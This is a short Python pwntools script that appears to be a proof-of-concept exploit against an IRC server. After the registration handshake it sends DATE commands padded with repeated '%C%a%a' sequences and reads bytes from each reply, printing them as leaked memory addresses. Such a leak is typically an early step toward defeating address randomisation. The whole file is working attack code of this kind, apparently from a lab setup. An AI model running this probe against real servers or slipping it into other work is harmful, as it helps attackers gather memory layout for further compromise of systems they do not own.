from pwn import *
import sys

p = remote(sys.argv[1], int(sys.argv[2]))

p.send(b'CAP LS\r\n')
print(p.readuntil(b'\r\n'))
p.send(b'NICK vagrant\r\n')
p.send(b'USER vagrant vagrant localhost :vagrant\r\n')
p.send(b'CAP REQ :multi-prefix\r\n')
y = p.readuntil(b'\r\n').rstrip()
print(y)

if y.startswith(b'PING') == True:
    z = y.split(b':')[1]
    p.send(b'PONG :' + z + b'\r\n')
p.send(b'CAP END\r\n')
print(p.readuntil(b':+ix\r\n'))

for i in range(10):
    p.send(b'DATE ' + b'%C%a%a'*(i) + b'\r\n')
    y = p.readuntil(b'\r\n').rstrip(b'\r\n')
    possible_leak = y[-6:] + b'\x00\x00'

    l = u64(possible_leak)
    print(b'[ADDR] ', hex(l))

p.close()
